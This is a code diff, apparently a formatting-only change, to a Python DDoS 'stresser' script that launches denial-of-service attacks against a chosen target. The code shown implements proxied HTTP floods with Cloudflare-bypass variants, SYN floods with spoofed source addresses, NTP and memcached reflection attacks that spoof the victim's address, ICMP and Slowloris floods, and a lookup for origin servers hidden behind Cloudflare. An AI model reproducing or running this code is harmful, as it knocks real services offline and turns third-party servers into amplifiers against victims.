@@ -1,7 +1,11 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
-l7 = ["CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "OSTRESS", "DYN", "SLOW", "HEAD", "HIT", "NULL", "COOKIE", "BRUST", "PPS", "EVEN", "GSB", "DGB", "AVB"]
+l7 = [
+    "CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "OSTRESS", "DYN", "SLOW",
+    "HEAD", "HIT", "NULL", "COOKIE", "BRUST", "PPS", "EVEN", "GSB", "DGB",
+    "AVB"
+]
 l4 = ["TCP", "UDP", "SYN", "VSE", "MEM", "NTP"]
 l3 = ["POD", "ICMP"]
 to = ["CFIP", "DNS", "PING", "CHECK", "DSTAT", "INFO"]
@@ -25,109 +29,163 @@ def start_attack(method, threads, event, socks_type):
     global out_file
     # layer7
     cmethod = str(method.upper())
-    if (cmethod != "HIT") and (cmethod not in l4) and (cmethod not in l3) and (cmethod != "OSTRESS"):
+    if (cmethod != "HIT") and (cmethod not in l4) and (cmethod not in l3) and (
+            cmethod != "OSTRESS"):
         out_file = str("files/proxys/" + sys.argv[5])
         proxydl(out_file, socks_type)
-        print("{} Attack Started To {}:{} For {} Seconds With {}/{} Proxy ".format(method, target, port, sys.argv[7],len(proxies), str(nums)))
+        print("{} Attack Started To {}:{} For {} Seconds With {}/{} Proxy ".
+              format(method, target, port, sys.argv[7], len(proxies),
+                     str(nums)))
     else:
-        print("{} Attack Started To {}:{} For {} Seconds".format(method, target, port, sys.argv[7]))
+        print("{} Attack Started To {}:{} For {} Seconds".format(
+            method, target, port, sys.argv[7]))
     try:
         if method == "post":
             for _ in range(threads):
-                threading.Thread(target=post, args=(event, socks_type), daemon=True).start()
+                threading.Thread(target=post,
+                                 args=(event, socks_type),
+                                 daemon=True).start()
         elif method == "brust":
             for _ in range(threads):
-                threading.Thread(target=brust, args=(event, socks_type), daemon=True).start()
+                threading.Thread(target=brust,
+                                 args=(event, socks_type),
+                                 daemon=True).start()
         elif method == "get":
             for _ in range(threads):
-                threading.Thread(target=http, args=(event, socks_type), daemon=True).start()
+                threading.Thread(target=http,
+                                 args=(event, socks_type),
+                                 daemon=True).start()
         elif method == "pps":
             for _ in range(threads):
-                threading.Thread(target=pps, args=(event, socks_type), daemon=True).start()
+                threading.Thread(target=pps,
+                                 args=(event, socks_type),
+                                 daemon=True).start()
         elif method == "even":
             for _ in range(threads):
-                threading.Thread(target=even, args=(event, socks_type), daemon=True).start()
+                threading.Thread(target=even,
+                                 args=(event, socks_type),
+                                 daemon=True).start()
         elif method == "ovh":
             for _ in range(threads):
-                threading.Thread(target=ovh, args=(event, socks_type), daemon=True).start()
+                threading.Thread(target=ovh,
+                                 args=(event, socks_type),
+                                 daemon=True).start()
         elif method == "capb":
             for _ in range(threads):
-                threading.Thread(target=capb, args=(event, socks_type), daemon=True).start()
+                threading.Thread(target=capb,
+                                 args=(event, socks_type),
+                                 daemon=True).start()
         elif method == "cookie":
             for _ in range(threads):
-                threading.Thread(target=cookie, args=(event, socks_type), daemon=True).start()
+                threading.Thread(target=cookie,
+                                 args=(event, socks_type),
+                                 daemon=True).start()
         elif method == "tor":
             for _ in range(threads):
-                threading.Thread(target=tor, args=(event, socks_type), daemon=True).start()
+                threading.Thread(target=tor,
+                                 args=(event, socks_type),
+                                 daemon=True).start()
         elif method == "bypass":
             for _ in range(threads):
-                threading.Thread(target=bypass, args=(event, socks_type), daemon=True).start()
+                threading.Thread(target=bypass,
+                                 args=(event, socks_type),
+                                 daemon=True).start()
         elif method == "head":
             for _ in range(threads):
-                threading.Thread(target=head, args=(event, socks_type), daemon=True).start()
+                threading.Thread(target=head,
+                                 args=(event, socks_type),
+                                 daemon=True).start()
         elif method == "stress":
             for _ in range(threads):
-                threading.Thread(target=stress, args=(event, socks_type), daemon=True).start()
+                threading.Thread(target=stress,
+                                 args=(event, socks_type),
+                                 daemon=True).start()
         elif method == "ostress":
             for _ in range(threads):
-                threading.Thread(target=ostress, args=(event, socks_type), daemon=True).start()
+                threading.Thread(target=ostress,
+                                 args=(event, socks_type),
+                                 daemon=True).start()
         elif method == "null":
             for _ in range(threads):
-                threading.Thread(target=null, args=(event, socks_type), daemon=True).start()
+                threading.Thread(target=null,
+                                 args=(event, socks_type),
+                                 daemon=True).start()
         elif method == "cfb":
             for _ in range(threads):
-                threading.Thread(target=cfb, args=(event, socks_type), daemon=True).start()
+                threading.Thread(target=cfb,
+                                 args=(event, socks_type),
+                                 daemon=True).start()
         elif method == "avb":
             for _ in range(threads):
-                threading.Thread(target=AVB, args=(event, socks_type), daemon=True).start()
+                threading.Thread(target=AVB,
+                                 args=(event, socks_type),
+                                 daemon=True).start()
         elif method == "gsb":
             for _ in range(threads):
-                threading.Thread(target=gsb, args=(event, socks_type), daemon=True).start()
+                threading.Thread(target=gsb,
+                                 args=(event, socks_type),
+                                 daemon=True).start()
         elif method == "dgb":
             for _ in range(threads):
-                threading.Thread(target=dgb, args=(event, socks_type), daemon=True).start()
+                threading.Thread(target=dgb,
+                                 args=(event, socks_type),
+                                 daemon=True).start()
         elif method == "dyn":
             for _ in range(threads):
-                threading.Thread(target=dyn, args=(event, socks_type), daemon=True).start()
+                threading.Thread(target=dyn,
+                                 args=(event, socks_type),
+                                 daemon=True).start()
         elif method == "hit":
             for _ in range(threads):
-                threading.Thread(target=hit, args=(event, timer), daemon=True).start()
+                threading.Thread(target=hit, args=(event, timer),
+                                 daemon=True).start()
 
         # layer4
 
         elif method == "vse":
             for _ in range(threads):
-                threading.Thread(target=vse, args=(event, timer), daemon=True).start()
+                threading.Thread(target=vse, args=(event, timer),
+                                 daemon=True).start()
         elif method == "udp":
             for _ in range(threads):
-                threading.Thread(target=udp, args=(event, timer), daemon=True).start()
+                threading.Thread(target=udp, args=(event, timer),
+                                 daemon=True).start()
         elif method == "tcp":
             for _ in range(threads):
-                threading.Thread(target=tcp, args=(event, timer), daemon=True).start()
+                threading.Thread(target=tcp, args=(event, timer),
+                                 daemon=True).start()
         elif method == "syn":
             for _ in range(threads):
-                threading.Thread(target=syn, args=(event, timer), daemon=True).start()
+                threading.Thread(target=syn, args=(event, timer),
+                                 daemon=True).start()
         elif method == "mem":
             for _ in range(threads):
-                threading.Thread(target=mem, args=(event, timer), daemon=True).start()
+                threading.Thread(target=mem, args=(event, timer),
+                                 daemon=True).start()
         elif method == "ntp":
             for _ in range(threads):
-                threading.Thread(target=ntp, args=(event, timer), daemon=True).start()
+                threading.Thread(target=ntp, args=(event, timer),
+                                 daemon=True).start()
 
         # layer3
         elif method == "icmp":
             for _ in range(threads):
-                threading.Thread(target=icmp, args=(event, timer), daemon=True).start()
+                threading.Thread(target=icmp, args=(event, timer),
+                                 daemon=True).start()
         elif method == "pod":
             for _ in range(threads):
-                threading.Thread(target=pod, args=(event, timer), daemon=True).start()
+                threading.Thread(target=pod, args=(event, timer),
+                                 daemon=True).start()
     except:
         pass
 
+
 def random_data():
-    return str(Choice(strings) + str(Intn(0, 271400281257)) + Choice(strings) + str(Intn(0, 271004281257)) + Choice(
-        strings) + Choice(strings) + str(Intn(0, 271400281257)) + Choice(strings) + str(Intn(0, 271004281257)) + Choice(
-        strings))
+    return str(
+        Choice(strings) + str(Intn(0, 271400281257)) + Choice(strings) +
+        str(Intn(0, 271004281257)) + Choice(strings) + Choice(strings) +
+        str(Intn(0, 271400281257)) + Choice(strings) +
+        str(Intn(0, 271004281257)) + Choice(strings))
 
 
 def Headers(method):
@@ -209,7 +267,8 @@ def Headers(method):
         connection += "pragma: no-cache\r\n"
         connection += "X-Forwarded-For: " + spoofer() + "\r\n"
         data = str(random._urandom(8))
-        length = "Content-Length: " + str(len(data)) + " \r\nConnection: Keep-Alive\r\n"
+        length = "Content-Length: " + str(
+            len(data)) + " \r\nConnection: Keep-Alive\r\n"
         header = post_host + accept + connection + refer + content + user_agent + length + "\n" + data + "\r\n\r\n"
     elif method == "hit":
         post_host = "POST " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
@@ -221,7 +280,8 @@ def Headers(method):
         connection += "X-Forwarded-For: " + spoofer() + "\r\n"
         accept = Choice(acceptall) + "\r\n"
         data = str(random._urandom(8))
-        length = "Content-Length: " + str(len(data)) + " \r\nConnection: Keep-Alive\r\n"
+        length = "Content-Length: " + str(
+            len(data)) + " \r\nConnection: Keep-Alive\r\n"
         header = post_host + accept + connection + refer + content + user_agent + length + "\n" + data + "\r\n\r\n"
     return header
 
@@ -264,16 +324,22 @@ def udp(event, timer):
                 s.close()
         except:
             s.close()
-            
+
+
 def icmp(event, timer):
     event.wait()
     while time.time() < timer:
         try:
             for _ in range(multiple):
                 packet = random._urandom(int(Intn(1024, 60000)))
-                pig(target, count=10, interval=0.2, payload_size=len(packet), payload=packet)
+                pig(target,
+                    count=10,
+                    interval=0.2,
+                    payload_size=len(packet),
+                    payload=packet)
         except:
             pass
+
 
 ntp_payload = "\x17\x00\x03\x2a" + "\x00" * 4
 
@@ -284,11 +350,9 @@ def ntp(event, timer):
     event.wait()
     while time.time() < timer:
         try:
-            packet = (
-                    IP(dst=server, src=target)
-                    / UDP(sport=Intn(1, 65535), dport=int(port))
-                    / Raw(load=ntp_payload)
-            )
+            packet = (IP(dst=server, src=target) /
+                      UDP(sport=Intn(1, 65535), dport=int(port)) /
+                      Raw(load=ntp_payload))
             try:
                 for _ in range(multiple):
                     send(packet, count=packets, verbose=False)
@@ -308,17 +372,15 @@ def mem(event, timer):
     while time.time() < timer:
         try:
             try:
-                packet = (
-                        IP(dst=server, src=target)
-                        / UDP(sport=port, dport=11211)
-                        / Raw(load=mem_payload)
-                )
+                packet = (IP(dst=server, src=target) /
+                          UDP(sport=port, dport=11211) / Raw(load=mem_payload))
                 for _ in range(multiple):
                     send(packet, count=packets, verbose=False)
             except:
                 pass
         except:
             pass
+
 
 def tcp(event, timer):
     event.wait()
@@ -337,6 +399,7 @@ def tcp(event, timer):
         except:
             s.close()
 
+
 def vse(event, timer):
     event.wait()
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -351,72 +414,80 @@ def vse(event, timer):
                 s.close()
         except:
             s.close()
+
+
 class DNSQuery:
+
     def __init__(self, data):
         self.data = data
         self.dominio = ''
         self.DnsType = ''
 
-        HDNS=data[-4:-2].encode("hex")
+        HDNS = data[-4:-2].encode("hex")
         if HDNS == "0001":
-            self.DnsType='A'
+            self.DnsType = 'A'
         elif HDNS == "000f":
-            self.DnsType='MX'
+            self.DnsType = 'MX'
         elif HDNS == "0002":
-            self.DnsType='NS'
+            self.DnsType = 'NS'
         elif HDNS == "0010":
-            self.DnsType="TXT"
+            self.DnsType = "TXT"
         else:
-            self.DnsType="Unknown"
+            self.DnsType = "Unknown"
 
-        tipo = (ord(data[2]) >> 3) & 15   # Opcode bits
-        if tipo == 0:                     # Standard query
-            ini=12
-            lon=ord(data[ini])
+        tipo = (ord(data[2]) >> 3) & 15  # Opcode bits
+        if tipo == 0:  # Standard query
+            ini = 12
+            lon = ord(data[ini])
             while lon != 0:
-                self.dominio+=data[ini+1:ini+lon+1]+'.'
-                ini+=lon+1
-                lon=ord(data[ini])
+                self.dominio += data[ini + 1:ini + lon + 1] + '.'
+                ini += lon + 1
+                lon = ord(data[ini])
+
     def respuesta(self, ip):
-        packet=''
+        packet = ''
         if self.dominio:
-            packet+=self.data[:2] + "\x81\x80"
-            packet+=self.data[4:6] + self.data[4:6] + '\x00\x00\x00\x00'   # Questions and Answers Counts
-            packet+=self.data[12:]                                         # Original Domain Name Question
-            packet+='\xc0\x0c'                                             # Pointer to domain name
-            packet+='\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'             # Response type, ttl and resource data length -> 4 bytes
-            packet+=str.join('',map(lambda x: chr(int(x)), ip.split('.'))) # 4bytes of IP
+            packet += self.data[:2] + "\x81\x80"
+            packet += self.data[4:6] + self.data[
+                4:6] + '\x00\x00\x00\x00'  # Questions and Answers Counts
+            packet += self.data[12:]  # Original Domain Name Question
+            packet += '\xc0\x0c'  # Pointer to domain name
+            packet += '\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'  # Response type, ttl and resource data length -> 4 bytes
+            packet += str.join('', map(lambda x: chr(int(x)),
+                                       ip.split('.')))  # 4bytes of IP
         return packet
+
 
 def dns(event, timer):
     event.wait()
     while time.time() < timer:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            s.bind(('',53))
+            s.bind(('', 53))
             data, addr = s.recvfrom(1024)
             p = DNSQuery(data)
             for _ in range(multiple):
                 s.sendto(p.respuesta(target), addr)
         except:
             s.close()
-            
+
+
 def syn(event, timer):
     event.wait()
     while time.time() < timer:
         try:
-            IP_Packet = IP ()
+            IP_Packet = IP()
             IP_Packet.src = randomIP()
             IP_Packet.dst = target
 
-            TCP_Packet = TCP ()
+            TCP_Packet = TCP()
             TCP_Packet.sport = randint(1, 65535)
             TCP_Packet.dport = int(port)
             TCP_Packet.flags = "S"
             TCP_Packet.seq = randint(1000, 9000)
             TCP_Packet.window = randint(1000, 9000)
             for _ in range(multiple):
-                send(IP_Packet/TCP_Packet, verbose=0)
+                send(IP_Packet / TCP_Packet, verbose=0)
         except:
             pass
 
@@ -442,7 +513,8 @@ def stop():
 def dyn(event, socks_type):
     header = Headers("dyn")
     proxy = Choice(proxies).strip().split(":")
-    get_host = "GET " + path + "?" + random_data() + " HTTP/1.1\r\nHost: " + random_data() + "." + target + "\r\n"
+    get_host = "GET " + path + "?" + random_data(
+    ) + " HTTP/1.1\r\nHost: " + random_data() + "." + target + "\r\n"
     s = socks.socksocket()
     request = get_host + header
     event.wait()
@@ -498,6 +570,7 @@ def http(event, socks_type):
         except:
             s.close()
 
+
 def capb(event, socks_type):
     header = Headers("get")
     proxy = Choice(proxies).strip().split(":")
@@ -527,10 +600,12 @@ def capb(event, socks_type):
         except:
             s.close()
 
+
 def ovh(event, socks_type):
     header = Headers("ovh")
     proxy = Choice(proxies).strip().split(":")
-    get_host = "HEAD " + path + "/" + str(Intn(1111111111, 9999999999)) + " HTTP/1.1\r\nHost: " + target + "\r\n"
+    get_host = "HEAD " + path + "/" + str(Intn(
+        1111111111, 9999999999)) + " HTTP/1.1\r\nHost: " + target + "\r\n"
     request = get_host + header
     event.wait()
     s = socks.socksocket()
@@ -680,7 +755,8 @@ def cookie(event, socks_type):
 def cfb(event, socks_type):
     header = Headers("get")
     proxy = Choice(proxies).strip().split(":")
-    get_host = "GET " + path + "?" + random_data() + " HTTP/1.1\r\nHost: " + target + "\r\n"
+    get_host = "GET " + path + "?" + random_data(
+    ) + " HTTP/1.1\r\nHost: " + target + "\r\n"
     request = get_host + header
     event.wait()
     s = socks.socksocket()
@@ -709,10 +785,10 @@ def cfb(event, socks_type):
 
 
 # def tor(event, socks_type):
-    # event.wait()
-    # while time.time() < timer:
-        # with tor_requests_session() as s:
-            # s.get(sys.argv[2])
+# event.wait()
+# while time.time() < timer:
+# with tor_requests_session() as s:
+# s.get(sys.argv[2])
 
 
 def AVB(event, socks_type):
@@ -723,11 +799,15 @@ def AVB(event, socks_type):
         try:
             s = cfscrape.create_scraper()
             if socks_type == 5 or socks_type == 4:
-                s.proxies['http'] = 'socks{}://'.format(socks_type) + str(proxy[0]) + ":" + str(proxy[1])
-                s.proxies['https'] = 'socks{}://'.format(socks_type) + str(proxy[0]) + ":" + str(proxy[1])
+                s.proxies['http'] = 'socks{}://'.format(socks_type) + str(
+                    proxy[0]) + ":" + str(proxy[1])
+                s.proxies['https'] = 'socks{}://'.format(socks_type) + str(
+                    proxy[0]) + ":" + str(proxy[1])
             if socks_type == 1:
-                s.proxies['http'] = 'http://' + str(proxy[0]) + ":" + str(proxy[1])
-                s.proxies['https'] = 'https://' + str(proxy[0]) + ":" + str(proxy[1])
+                s.proxies['http'] = 'http://' + str(proxy[0]) + ":" + str(
+                    proxy[1])
+                s.proxies['https'] = 'https://' + str(proxy[0]) + ":" + str(
+                    proxy[1])
             if protocol == "https":
                 s.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
             try:
@@ -747,11 +827,15 @@ def bypass(event, socks_type):
         try:
             s = requests.Session()
             if socks_type == 5 or socks_type == 4:
-                s.proxies['http'] = 'socks{}://'.format(socks_type) + str(proxy[0]) + ":" + str(proxy[1])
-                s.proxies['https'] = 'socks{}://'.format(socks_type) + str(proxy[0]) + ":" + str(proxy[1])
+                s.proxies['http'] = 'socks{}://'.format(socks_type) + str(
+                    proxy[0]) + ":" + str(proxy[1])
+                s.proxies['https'] = 'socks{}://'.format(socks_type) + str(
+                    proxy[0]) + ":" + str(proxy[1])
             if socks_type == 1:
-                s.proxies['http'] = 'http://' + str(proxy[0]) + ":" + str(proxy[1])
-                s.proxies['https'] = 'https://' + str(proxy[0]) + ":" + str(proxy[1])
+                s.proxies['http'] = 'http://' + str(proxy[0]) + ":" + str(
+                    proxy[1])
+                s.proxies['https'] = 'https://' + str(proxy[0]) + ":" + str(
+                    proxy[1])
             if protocol == "https":
                 s.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
             try:
@@ -770,11 +854,15 @@ def dgb(event, socks_type):
         try:
             s = cfscrape.create_scraper()
             if socks_type == 5 or socks_type == 4:
-                s.proxies['http'] = 'socks{}://'.format(socks_type) + str(proxy[0]) + ":" + str(proxy[1])
-                s.proxies['https'] = 'socks{}://'.format(socks_type) + str(proxy[0]) + ":" + str(proxy[1])
+                s.proxies['http'] = 'socks{}://'.format(socks_type) + str(
+                    proxy[0]) + ":" + str(proxy[1])
+                s.proxies['https'] = 'socks{}://'.format(socks_type) + str(
+                    proxy[0]) + ":" + str(proxy[1])
             if socks_type == 1:
-                s.proxies['http'] = 'http://' + str(proxy[0]) + ":" + str(proxy[1])
-                s.proxies['https'] = 'https://' + str(proxy[0]) + ":" + str(proxy[1])
+                s.proxies['http'] = 'http://' + str(proxy[0]) + ":" + str(
+                    proxy[1])
+                s.proxies['https'] = 'https://' + str(proxy[0]) + ":" + str(
+                    proxy[1])
             if protocol == "https":
                 s.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
             try:
@@ -790,7 +878,8 @@ def dgb(event, socks_type):
 def head(event, socks_type):
     proxy = Choice(proxies).strip().split(":")
     header = Headers("head")
-    head_host = "HEAD " + path + "?" + random_data() + " HTTP/1.1\r\nHost: " + target + "\r\n"
+    head_host = "HEAD " + path + "?" + random_data(
+    ) + " HTTP/1.1\r\nHost: " + target + "\r\n"
     request = head_host + header
     event.wait()
     s = socks.socksocket()
@@ -820,7 +909,8 @@ def head(event, socks_type):
 def null(event, socks_type):
     proxy = Choice(proxies).strip().split(":")
     header = Headers("null")
-    head_host = "HEAD " + path + "?" + random_data() + " HTTP/1.1\r\nHost: " + target + "\r\n"
+    head_host = "HEAD " + path + "?" + random_data(
+    ) + " HTTP/1.1\r\nHost: " + target + "\r\n"
     request = head_host + header
     event.wait()
     s = socks.socksocket()
@@ -850,7 +940,8 @@ def null(event, socks_type):
 def gsb(event, socks_type):
     proxy = Choice(proxies).strip().split(":")
     header = Headers("head")
-    head_host = "HEAD " + path + "?q=" + str(Intn(000000000, 999999999)) + " HTTP/1.1\r\nHost: " + target + "\r\n"
+    head_host = "HEAD " + path + "?q=" + str(Intn(
+        000000000, 999999999)) + " HTTP/1.1\r\nHost: " + target + "\r\n"
     request = head_host + header
     event.wait()
     s = socks.socksocket()
@@ -997,6 +1088,7 @@ def ostress(event, timer):
 socket_list = []
 t = 0
 
+
 def slow(conn, socks_type):
     global t
     proxy = Choice(proxies).strip().split(":")
@@ -1072,13 +1164,25 @@ def check_socks(ms):
     thread_list = []
     for lines in list(proxies):
         if choice == "5":
-            th = threading.Thread(target=checking, args=(lines, 5, ms,))
+            th = threading.Thread(target=checking, args=(
+                lines,
+                5,
+                ms,
+            ))
             th.start()
         if choice == "4":
-            th = threading.Thread(target=checking, args=(lines, 4, ms,))
+            th = threading.Thread(target=checking, args=(
+                lines,
+                4,
+                ms,
+            ))
             th.start()
         if choice == "1":
-            th = threading.Thread(target=checking, args=(lines, 1, ms,))
+            th = threading.Thread(target=checking, args=(
+                lines,
+                1,
+                ms,
+            ))
             th.start()
         thread_list.append(th)
         sleep(0.01)
@@ -1121,17 +1225,22 @@ def downloadsocks(choice):
     if choice == "4":
         f = open(out_file, 'wb')
         try:
-            r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks4", timeout=30)
+            r = requests.get(
+                "https://www.proxy-list.download/api/v1/get?type=socks4",
+                timeout=30)
             f.write(r.content)
         except:
             pass
         try:
-            r = requests.get("https://www.proxyscan.io/download?type=socks4", timeout=30)
+            r = requests.get("https://www.proxyscan.io/download?type=socks4",
+                             timeout=30)
             f.write(r.content)
         except:
             pass
         try:
-            r = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt", timeout=30)
+            r = requests.get(
+                "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
+                timeout=30)
             f.write(r.content)
             f.close()
         except:
@@ -1139,25 +1248,31 @@ def downloadsocks(choice):
     if choice == "5":
         f = open(out_file, 'wb')
         try:
-            r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&country=all",
+            r = requests.get(
+                "https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&country=all",
+                timeout=30)
+            f.write(r.content)
+        except:
+            pass
+        try:
+            r = requests.get(
+                "https://www.proxy-list.download/api/v1/get?type=socks5",
+                timeout=30)
+            f.write(r.content)
+            f.close()
+        except:
+            pass
+        try:
+            r = requests.get("https://www.proxyscan.io/download?type=socks5",
                              timeout=30)
             f.write(r.content)
-        except:
-            pass
-        try:
-            r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks5", timeout=30)
-            f.write(r.content)
             f.close()
         except:
             pass
         try:
-            r = requests.get("https://www.proxyscan.io/download?type=socks5", timeout=30)
-            f.write(r.content)
-            f.close()
-        except:
-            pass
-        try:
-            r = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt", timeout=30)
+            r = requests.get(
+                "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
+                timeout=30)
             f.write(r.content)
         except:
             pass
@@ -1172,25 +1287,31 @@ def downloadsocks(choice):
     if choice == "1":
         f = open(out_file, 'wb')
         try:
-            r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=http&country=all",
+            r = requests.get(
+                "https://api.proxyscrape.com/?request=displayproxies&proxytype=http&country=all",
+                timeout=30)
+            f.write(r.content)
+        except:
+            pass
+        try:
+            r = requests.get(
+                "https://www.proxy-list.download/api/v1/get?type=http",
+                timeout=30)
+            f.write(r.content)
+            f.close()
+        except:
+            pass
+        try:
+            r = requests.get("https://www.proxyscan.io/download?type=http",
                              timeout=30)
             f.write(r.content)
-        except:
-            pass
-        try:
-            r = requests.get("https://www.proxy-list.download/api/v1/get?type=http", timeout=30)
-            f.write(r.content)
             f.close()
         except:
             pass
         try:
-            r = requests.get("https://www.proxyscan.io/download?type=http", timeout=30)
-            f.write(r.content)
-            f.close()
-        except:
-            pass
-        try:
-            r = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt", timeout=30)
+            r = requests.get(
+                "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
+                timeout=30)
             f.write(r.content)
             f.close()
         except:
@@ -1200,7 +1321,7 @@ def downloadsocks(choice):
 def main():
     global proxies, multiple, choice, timer, out_file
     method = str(sys.argv[1]).lower()
-    
+
     out_file = str("files/proxys/" + sys.argv[5])
     if not os.path.exists(out_file):
         makefile(out_file)
@@ -1237,10 +1358,13 @@ def main():
     if method == "slow":
         conn = threads
         proxydl(out_file, socks_type)
-        print("{} Attack Started To {}:{} For {} Seconds With {}/{} Proxy ".format(method, target, port, sys.argv[7],len(proxies), str(nums)))
+        print("{} Attack Started To {}:{} For {} Seconds With {}/{} Proxy ".
+              format(method, target, port, sys.argv[7], len(proxies),
+                     str(nums)))
 
         for _ in range(conn):
-            threading.Thread(target=slow, args=(conn, socks_type), daemon=True).start()
+            threading.Thread(target=slow, args=(conn, socks_type),
+                             daemon=True).start()
     else:
         multiple = str((sys.argv[6]))
         if multiple == "":
@@ -1281,24 +1405,27 @@ bds = 0
 # layer tool :||||||||||||
 def toolgui():
     global bds
-    tos = str(to).replace("'", "").replace("[", "").replace("]", "").replace(",", "\n")
+    tos = str(to).replace("'", "").replace("[",
+                                           "").replace("]",
+                                                       "").replace(",", "\n")
     if bds == 0:
         print('''
 Tools:
- ''' + tos+ '''
+ ''' + tos + '''
 Other:
  Clear
  Exit
         ''')
     bds = 1
-    tool = input(socket.gethostname() + "@"+name+":~# ").lower()
-    if tool != "e" and (tool != "exit") and (tool != "q") and (tool != "quit") and (tool != "logout") and (
-            tool != "close"):
+    tool = input(socket.gethostname() + "@" + name + ":~# ").lower()
+    if tool != "e" and (tool != "exit") and (tool != "q") and (
+            tool != "quit") and (tool != "logout") and (tool != "close"):
         pass
     else:
         exit()
     if tool == "cfip":
-        domain = input(socket.gethostname() + '@'+name+'}:~/give-me-ipaddress# ')
+        domain = input(socket.gethostname() + '@' + name +
+                       '}:~/give-me-ipaddress# ')
         cfip(domain)
         return tools()
     elif tool == "dstat":
@@ -1307,19 +1434,25 @@ Other:
     elif tool == "dns":
         return tools()
     elif tool == "check":
-        domain = input(socket.gethostname() + '@'+name+'}:~/give-me-ipaddress# ')
+        domain = input(socket.gethostname() + '@' + name +
+                       '}:~/give-me-ipaddress# ')
         check(domain)
         return tools()
     elif tool == "ping":
-        domain = input(socket.gethostname() + '@'+name+'}:~/give-me-ipaddress# ')
+        domain = input(socket.gethostname() + '@' + name +
+                       '}:~/give-me-ipaddress# ')
         piger(domain)
         return tools()
     elif tool == "info":
-        domain = input(socket.gethostname() + '@'+name+'}:~/give-me-ipaddress# ')
+        domain = input(socket.gethostname() + '@' + name +
+                       '}:~/give-me-ipaddress# ')
         piger(domain)
         return tools()
     elif (tool == "help") or (tool == "h") or (tool == "?"):
-        tos = str(to).replace("'", "").replace("[", "").replace("]", "").replace(",", "\n")
+        tos = str(to).replace("'",
+                              "").replace("[",
+                                          "").replace("]",
+                                                      "").replace(",", "\n")
         print('''
 Tools:
  {tos}
@@ -1369,7 +1502,10 @@ def tools():
         elif tool == "ping":
             piger(domain)
         elif tool == "dstat":
-            address = requests.get('http://ipinfo.io/ip', headers={"User-Agent": UserAgent, }).text
+            address = requests.get('http://ipinfo.io/ip',
+                                   headers={
+                                       "User-Agent": UserAgent,
+                                   }).text
             print('now please attack to {address}')
             os.system('dstat')
         else:
@@ -1381,9 +1517,15 @@ def tools():
 
 def cfip(domain):
     if str("http") in str(domain):
-        domain = domain.replace('https://', '').replace('http:', '').replace('/')
+        domain = domain.replace('https://', '').replace('http:',
+                                                        '').replace('/')
     URL = "http://www.crimeflare.org:82/cgi-bin/cfsearch.cgi"
-    r = requests.post(URL, data={"cfS": {domain}}, headers={"User-Agent": UserAgent, }, timeout=1)
+    r = requests.post(URL,
+                      data={"cfS": {domain}},
+                      headers={
+                          "User-Agent": UserAgent,
+                      },
+                      timeout=1)
     print(r.text)
 
 
@@ -1396,15 +1538,17 @@ def check(domain):
         die = "OFFLINE"
     else:
         die = "ONLINE"
-    print('\nstatus_code: '+r.status_code)
-    print('status: '+die+'\n')
+    print('\nstatus_code: ' + r.status_code)
+    print('status: ' + die + '\n')
 
 
 def piger(siye):
     if str("https") in str(siye):
-        domain = str(siye).replace('https', '').replace('/', '').replace(':', '')
+        domain = str(siye).replace('https', '').replace('/',
+                                                        '').replace(':', '')
     elif str("http") in str(siye):
-        domain = str(siye).replace('http', '').replace('/', '').replace(':', '')
+        domain = str(siye).replace('http', '').replace('/',
+                                                       '').replace(':', '')
     else:
         domain = str(siye)
     print('please wait ...')
@@ -1413,10 +1557,10 @@ def piger(siye):
         die = "ONLINE"
     else:
         die = "OFFLINE"
-    print('\nAddress: '+r.address)
-    print('Ping: '+r.avg_rtt)
-    print('Aceepted Packets: '+r.packets_received+'/'+r.packets_sent)
-    print('status: '+die+'\n')
+    print('\nAddress: ' + r.address)
+    print('Ping: ' + r.avg_rtt)
+    print('Aceepted Packets: ' + r.packets_received + '/' + r.packets_sent)
+    print('status: ' + die + '\n')
 
 
 def usgeaseets():
@@ -1502,7 +1646,9 @@ def usgeaseets():
 def usge():
     usgeaseets()
     print('* Coded By MH_ProDev For Better Stresser')
-    print('python3 {} <method> <url> <socks_type5.4.1> <threads> <proxylist> <multiple> <timer>\n'.format(sys.argv[0]))
+    print(
+        'python3 {} <method> <url> <socks_type5.4.1> <threads> <proxylist> <multiple> <timer>\n'
+        .format(sys.argv[0]))
     print(' > Methods:')
     print(' - L3')
     print(' | {} | {} Methods'.format(l3s, len(l3)))
@@ -1515,8 +1661,8 @@ def usge():
     print(' - Other')
     print(' | {} | {} Methods'.format(ots, len(ot)))
     print(' - All {} Method \n'.format(len(methodsl)))
-    print(
-        'expmple:\n python3 {} {} {} {} {} {} {} {}'.format(sys.argv[0], metho, url, SOCKST, thr, proxylist, muli, tim))
+    print('expmple:\n python3 {} {} {} {} {} {} {} {}'.format(
+        sys.argv[0], metho, url, SOCKST, thr, proxylist, muli, tim))
 
 
 def makefile(text):
@@ -1527,6 +1673,7 @@ def makefile(text):
     else:
         open(text, 'w').close()
     print('File: ', text)
+
 
 if __name__ == '__main__':
     import os, requests, socket, socks, time, random, threading, sys, ssl, datetime, cfscrape, re, secrets
